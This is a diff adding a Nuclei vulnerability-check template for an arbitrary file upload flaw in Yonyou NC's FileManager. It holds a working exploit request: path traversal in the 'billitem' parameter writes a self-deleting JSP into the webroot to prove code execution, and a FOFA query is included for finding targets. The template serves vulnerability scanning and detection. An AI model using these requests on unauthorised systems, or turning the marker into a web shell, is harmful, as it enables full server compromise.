@@ -1,0 +1,46 @@
+id: yonyou-nc-filemanager-file-upload
+
+info:
+  name: Yonyou NC FileManager Arbitrary File Upload
+  author: Co5mos
+  severity: critical
+  description: |
+    Yonyou NC system's FileManager interface allows arbitrary file upload via the `filename` and `billitem` parameters, potentially leading to full server compromise.
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8BNC%E7%B3%BB%E7%BB%9FFileManager%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    fofa-query: 'app="用友-UFIDA-NC"'
+  tags: yonyou, fileupload, rce
+
+variables:
+  filename: "{{rand_base(6)}}.jsp"
+  num1: "{{rand_int(10000, 20000)}}"
+  num2: "{{rand_int(10000, 20000)}}"
+  result: "{{to_number(num1)*to_number(num2)}}"
+  boundary: "{{rand_base(30)}}"
+
+http:
+  - raw:
+      - |
+        POST /portal/pt/file/upload?pageId=login&filemanager=nc.uap.lfw.file.FileManager&iscover=true&billitem=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwebapps%5Cnc_web%5C HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary={{boundary}}
+
+        --{{boundary}}
+        Content-Disposition: form-data; name="file"; filename="{{filename}}" 
+        Content-Type: text/plain
+
+        <% out.print({{num1}}*{{num2}});new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+        --{{boundary}}--
+
+      - |
+        GET /{{filename}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_2 == 200
+          - contains(body_2, '{{result}}')
+        condition: and
